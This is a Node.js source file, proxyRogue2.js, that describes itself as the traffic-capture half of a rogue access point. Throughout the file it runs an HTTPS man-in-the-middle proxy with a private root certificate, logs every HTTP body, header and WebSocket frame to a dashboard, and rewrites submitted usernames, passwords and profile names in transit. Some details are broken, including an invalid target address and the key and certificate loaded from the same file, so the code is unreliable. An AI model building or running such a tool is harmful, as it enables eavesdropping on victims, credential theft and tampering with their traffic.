/**
 * proxyRogue2.js
 * 
 * This single-file Node.js application:
 *  - Acts as a transparent HTTP/WS proxy using Express and http-proxy on port 9015.
 *  - Logs HTTP, WebSocket, TCP, and UDP traffic.
 *  - Serves a dashboard view and a live RSA decryption view.
 *  - Sets up an HTTPS MITM proxy using http-mitm-proxy on port 9043.
 *  - Also listens for raw TCP (port 9020) and UDP (port 9021) traffic.
 *
 * No port 8000 references are used.
 * 
 * NOTE: A complete rogue access point also requires OS-level configuration (e.g. hostapd, dnsmasq, iptables).
 */

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
  });
  
  const express = require('express');
  const httpProxy = require('http-proxy');
  const http = require('http');
  const { PassThrough } = require('stream');
  const querystring = require('querystring');
  const path = require('path');
  const WebSocket = require('ws'); // For WebSocket server
  const net = require('net');
  const fs = require('fs');
  
  // -------------------------------
  // HTTPS MITM Proxy Setup (using http-mitm-proxy)
  // -------------------------------
  const MitmProxy = require('http-mitm-proxy').Proxy;
  const mitmProxy = new MitmProxy();
  
  const caKey = fs.readFileSync('./my-private-root-ca.crt.pem', 'utf8');
  const caCert = fs.readFileSync('./my-private-root-ca.crt.pem', 'utf8');
  
  mitmProxy.onCertificateRequired = function (hostname, callback) {
    return callback(null, { key: caKey, cert: caCert });
  };
  mitmProxy.onCertificateMissing = function (ctx, files, callback) {
    return callback(null, { key: caKey, cert: caCert });
  };
  
  mitmProxy.onRequest((ctx, callback) => {
    const reqUrl = ctx.clientToProxyRequest.url;
    console.log(`[MITM] HTTPS Request for: ${reqUrl}`);
    callback();
  });
  
  mitmProxy.listen({ port: 9043 }, () => {
    console.log('🚀 HTTPS MITM Proxy running on port 9043');
  });
  
  // -------------------------------
  // HTTP/WS Proxy & Express Section (Port 9015)
  // -------------------------------
  const app = express();
  const router = express.Router();
  
  app.set('view engine', 'ejs');
  app.set('views', path.join(__dirname, 'views'));
  
  const httpLogs = [];
  const wsLogs = [];
  const tcpLogs = [];
  const udpLogs = [];
  
  const FIXED_TARGET = '192.168.1.7x'; // Fixed target (no port 8000)
  
  const proxy = httpProxy.createProxyServer({ ws: true, changeOrigin: true });
  
  proxy.on('proxyReq', (proxyReq, req, res, options) => {
    const logMsg = `[Proxy] Outgoing Request Headers for ${req.method} ${req.url}: ${JSON.stringify(req.headers)}`;
    console.log(logMsg);
    httpLogs.push(logMsg);
    if (req.headers['origin'] && options && options.target) {
      try {
        const targetUrl = new URL(options.target);
        proxyReq.setHeader('Origin', targetUrl.origin);
        const overrideMsg = `[Proxy] Overriding Origin header to ${targetUrl.origin}`;
        console.log(overrideMsg);
        httpLogs.push(overrideMsg);
      } catch (error) {
        console.error('[Proxy] Error overriding Origin header:', error.message);
        proxyReq.removeHeader('origin');
      }
    }
  });
  
  proxy.on('proxyRes', (proxyRes, req, res) => {
    const logMsg = `[Proxy] Received response for ${req.method} ${req.url} with headers: ${JSON.stringify(proxyRes.headers)}`;
    console.log(logMsg);
    httpLogs.push(logMsg);
  });
  
  proxy.on('error', (err, req, res) => {
    const logMsg = `[Proxy] Error encountered: ${err.message}`;
    console.error(logMsg);
    httpLogs.push(logMsg);
  });
  
  app.use((req, res, next) => {
    const logMsg = `[HTTP] ${req.method} ${req.url} with headers: ${JSON.stringify(req.headers)}`;
    console.log(logMsg);
    httpLogs.push(logMsg);
    next();
  });
  
  app.use((req, res, next) => {
    const methodsWithBody = ['POST', 'PUT', 'PATCH', 'DELETE'];
    if (methodsWithBody.includes(req.method)) {
      let bodyData = [];
      req.on('data', chunk => bodyData.push(chunk));
      req.on('end', () => {
        if (bodyData.length > 0) {
          let bodyBuffer = Buffer.concat(bodyData);
          let bodyStr = bodyBuffer.toString('utf8');
          const originalMsg = `[HTTP] Original Request Body for ${req.method} ${req.url}: ${bodyStr}`;
          console.log(originalMsg);
          httpLogs.push(originalMsg);
          if (req.headers['content-type'] && req.headers['content-type'].includes('application/x-www-form-urlencoded')) {
            let parsedBody = querystring.parse(bodyStr);
            if (parsedBody.username && parsedBody.username === '35') {
              parsedBody.username = 'modified_username';
              httpLogs.push(`[HTTP] Modified username to ${parsedBody.username}`);
            }
            if (parsedBody.password && parsedBody.password === 'ogul') {
              parsedBody.password = 'modified_password';
              httpLogs.push(`[HTTP] Modified password to ${parsedBody.password}`);
            }
            if (parsedBody.name && parsedBody.name === 'proxied7') {
              parsedBody.name = 'modified_name';
              httpLogs.push(`[HTTP] Modified profile name to ${parsedBody.name}`);
            }
            bodyStr = querystring.stringify(parsedBody);
            bodyBuffer = Buffer.from(bodyStr, 'utf8');
            httpLogs.push(`[HTTP] Modified Request Body: ${bodyStr}`);
          }
          req.bodyBuffer = new PassThrough();
          req.bodyBuffer.end(bodyBuffer);
        }
        next();
      });
    } else {
      next();
    }
  });
  
  app.use((req, res, next) => {
    const oldWrite = res.write;
    const oldEnd = res.end;
    const chunks = [];
    res.write = function(chunk, ...args) {
      chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
      return oldWrite.apply(res, [chunk, ...args]);
    };
    res.end = function(chunk, ...args) {
      if (chunk) {
        chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
      }
      const body = Buffer.concat(chunks).toString('utf8');
      const logMsg = `[HTTP] Response Body for ${req.method} ${req.url}: ${body}`;
      console.log(logMsg);
      httpLogs.push(logMsg);
      return oldEnd.apply(res, [chunk, ...args]);
    };
    next();
  });
  
  const proxyHttp = (req, res) => {
    console.log('[HTTP Proxy] Forwarding HTTP request...');
    const target = FIXED_TARGET;
    const options = {
      target,
      changeOrigin: true,
      secure: true,
      xfwd: true,
      headers: {
        'X-Real-IP': req.ip,
        'X-Forwarded-For': req.ip,
        'X-Forwarded-Host': req.hostname,
      },
    };
    const csrfToken = req.headers['x-csrf-token'] || req.headers['csrf-token'];
    if (csrfToken) options.headers['x-csrf-token'] = csrfToken;
    if (req.bodyBuffer) options.buffer = req.bodyBuffer;
    proxy.web(req, res, options);
  };
  
  const proxyStatic = (req, res) => {
    console.log('[HTTP Proxy] Forwarding static HTTP request...');
    const target = FIXED_TARGET + '/static/';
    const options = {
      target,
      changeOrigin: true,
      secure: true,
      xfwd: true,
      headers: {
        'X-Real-IP': req.ip,
        'X-Forwarded-For': req.ip,
        'X-Forwarded-Host': req.hostname,
      },
    };
    const csrfToken = req.headers['x-csrf-token'] || req.headers['csrf-token'];
    if (csrfToken) options.headers['x-csrf-token'] = csrfToken;
    if (req.bodyBuffer) options.buffer = req.bodyBuffer;
    proxy.web(req, res, options);
  };
  
  router.use('/static', proxyStatic);
  router.use('/', proxyHttp);
  app.use(router);
  
  const fixedTarget = FIXED_TARGET;
  const httpServer = http.createServer(app);
  
  httpServer.on('upgrade', (req, socket, head) => {
    const logMsg = `[WS] Upgrade request for ${req.url} from ${req.socket.remoteAddress}`;
    console.log(logMsg);
    wsLogs.push(logMsg);
    console.log('[WS] Request Headers:', req.headers);
    wsLogs.push(`[WS] Request Headers: ${JSON.stringify(req.headers)}`);
  
    socket.on('data', (chunk) => {
      const dataMsg = `[WS] Client -> Proxy data: ${chunk.toString('utf8')}`;
      console.log(dataMsg);
      wsLogs.push(dataMsg);
    });
  
    socket.on('error', (err) => {
      console.error('[WS] Socket error:', err);
      wsLogs.push(`[WS] Socket error: ${err.message}`);
    });
  
    const originalWrite = socket.write.bind(socket);
    socket.write = function(chunk, encoding, callback) {
      const dataMsg = `[WS] Proxy -> Client data: ${Buffer.isBuffer(chunk) ? chunk.toString('utf8') : chunk}`;
      console.log(dataMsg);
      wsLogs.push(dataMsg);
      return originalWrite(chunk, encoding, callback);
    };
  
    if (req.headers.origin) {
      try {
        const targetUrl = new URL(fixedTarget);
        req.headers.origin = targetUrl.origin;
        const overrideMsg = `[WS] Overriding Origin header to ${targetUrl.origin}`;
        console.log(overrideMsg);
        wsLogs.push(overrideMsg);
      } catch (error) {
        const errMsg = `[WS] Error overriding Origin header: ${error.message}`;
        console.error(errMsg);
        wsLogs.push(errMsg);
      }
    }
    proxy.ws(req, socket, head, { target: fixedTarget });
  });
  

  const tcpPort = 9020;
  const tcpServer = net.createServer((socket) => {
    const msg = `[TCP] Client connected from ${socket.remoteAddress}:${socket.remotePort}`;
    console.log(msg);
    tcpLogs.push(msg);
    socket.on('data', (data) => {
      const msg = `[TCP] Data from ${socket.remoteAddress}:${socket.remotePort}: ${data.toString('utf8')}`;
      console.log(msg);
      tcpLogs.push(msg);
      socket.write(data);
    });
    socket.on('close', () => {
      const msg = `[TCP] Client disconnected from ${socket.remoteAddress}:${socket.remotePort}`;
      console.log(msg);
      tcpLogs.push(msg);
    });
  });

  tcpServer.on('error', (err) => {
    console.error('TCP Server error:', err);
  });
  tcpServer.on('connection', (socket) => {
    socket.on('error', (err) => {
      console.error(`[TCP] Socket error from ${socket.remoteAddress}:${socket.remotePort}:`, err);
    });
  });
  
  tcpServer.listen(tcpPort, () => {
    console.log(`🚀 TCP server running on port ${tcpPort}`);
  });
  
  const udpPort = 9021;
  const dgram = require('dgram');
  const udpServer = dgram.createSocket('udp4');
  udpServer.on('error', (err) => {
    console.log(`[UDP] Server error:\n${err.stack}`);
    udpServer.close();
  });
  udpServer.on('message', (msg, rinfo) => {
    const logMsg = `[UDP] Message from ${rinfo.address}:${rinfo.port}: ${msg.toString('utf8')}`;
    console.log(logMsg);
    udpLogs.push(logMsg);
    udpServer.send(msg, rinfo.port, rinfo.address, (err) => {
      if (err) console.error(err);
    });
  });
  udpServer.bind(udpPort, () => {
    console.log(`🚀 UDP server running on port ${udpPort}`);
  });
  
  app.get('/asdasdasd', (req, res) => {
    res.render('asdasdasd', { httpLogs, wsLogs, tcpLogs, udpLogs });
  });
  
  app.get('/encrypted/live', (req, res) => {
    res.render('live');
  });
  
  httpServer.on('error', (err) => {
    console.error('HTTP Server error:', err);
  });
  
  httpServer.listen(9015, () => {
    console.log('🚀 Proxy server running on http://localhost:9015');
  });
  